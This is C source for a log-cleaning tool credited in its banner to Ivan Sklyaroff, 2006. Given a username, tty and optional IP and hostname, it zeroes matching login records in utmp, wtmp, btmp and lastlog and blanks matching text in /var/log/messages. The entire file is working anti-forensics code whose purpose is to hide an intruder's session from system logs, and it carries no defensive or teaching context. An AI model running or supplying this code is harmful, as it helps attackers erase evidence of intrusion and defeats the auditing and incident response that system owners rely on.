#include <stdio.h>
#include <stdlib.h>
#include <utmp.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <pwd.h>
#include <lastlog.h>
#include <string.h>

#define UTMP_FILE "/var/run/utmp"
#define WTMP_FILE "/var/log/wtmp"
#define BTMP_FILE "/var/log/btmp"
#define LASTLOG_FILE "/var/log/lastlog"
#define MESSAGES_FILE "/var/log/messages"
#define MAXBUFF 8*1024

clear_info(char *name_file, char *info)
{
  char buffer[MAXBUFF];
  FILE *lin;
  int i;
  char *ukaz;
  char *token;
  char pusto[200];

  for (i = 0; i < 200; i++) pusto[i] = ' ';

  if ( (lin = fopen(name_file, "r+")) == 0) {
    perror(name_file);
    exit(-1);
  }

  while (fgets(buffer, MAXBUFF, lin) != NULL)
  {
    if ( (ukaz = strstr(buffer, info)) != 0) {
      fseek (lin, ftell(lin) - strlen(ukaz), SEEK_SET);
      token = strtok(ukaz, " ");
      strncpy(token, pusto, strlen(token));
      fputs(token, lin);
    }
  }

  fclose(lin);
}

dead_messages(char *name_file, char *username, char *tty, char *ip, char *hostname)
{
  clear_info(name_file, username);
  clear_info(name_file, tty);

  if (ip != NULL) clear_info(name_file, ip);
  if (hostname != NULL) clear_info(name_file, hostname);
}

dead_uwbtmp(char *name_file, char *username, char *tty)
{
  struct utmp pos;
  int fd;

  if ( (fd = open(name_file, O_RDWR)) == -1) {
    perror(name_file);
    return;
  }

  while (read(fd, &pos, sizeof(struct utmp)) > 0)
  {
    if ( (strncmp(pos.ut_name, username, sizeof(pos.ut_name)) == 0) &&
         (strncmp(pos.ut_line, tty, sizeof(pos.ut_line)) == 0) ) {      
      bzero(&pos, sizeof(struct utmp));
      if (lseek(fd, -sizeof(struct utmp), SEEK_CUR) != -1)
        write(fd, &pos, sizeof(struct utmp));
    }
  }

  close(fd);
}

dead_lastlog(char *name_file, char *username)
{
  struct passwd *pwd;
  struct lastlog pos;
  int fd;

  if ( (pwd = getpwnam(username)) != NULL)
  {
    if ( (fd = open(name_file, O_RDWR)) == -1) {
      perror(name_file);
      return;
    }
    
    lseek(fd, (long)pwd->pw_uid * sizeof(struct lastlog), SEEK_SET);
    bzero((char *)&pos, sizeof(struct lastlog));
    write(fd, (char *)&pos, sizeof(struct lastlog));
    close(fd);
  }
}

int main(int argc, char *argv[])
{
  char *username;
  char *tty;
  char *ip;
  char *hostname;

  if ((argc < 3) || (argc > 5)) {
    printf ("Usage: %s <username> <tty> [IP] [hostname]\n\n", argv[0]);
    exit(-1);
  }

  fprintf(stderr, "========================================\n");  
  fprintf(stderr, "= Log-cleaner by Ivan Sklyaroff, 2006. =\n");
  fprintf(stderr, "========================================\n");
  
  username = argv[1];
  tty      = argv[2];
  ip       = (argc > 3) ? argv[3] : NULL;
  hostname = (argc > 4) ? argv[4] : NULL;

  dead_uwbtmp(UTMP_FILE, username, tty);
  printf("utmp ok!\n");
  dead_uwbtmp(WTMP_FILE, username, tty);
  printf("wtmp ok!\n");
  dead_uwbtmp(BTMP_FILE, username, tty);
  printf("btmp ok!\n");
  dead_lastlog(LASTLOG_FILE, username);
  printf("lastlog ok!\n");
  dead_messages(MESSAGES_FILE, username, tty, ip, hostname);
  printf("messages ok!\n");

  return 0;
}
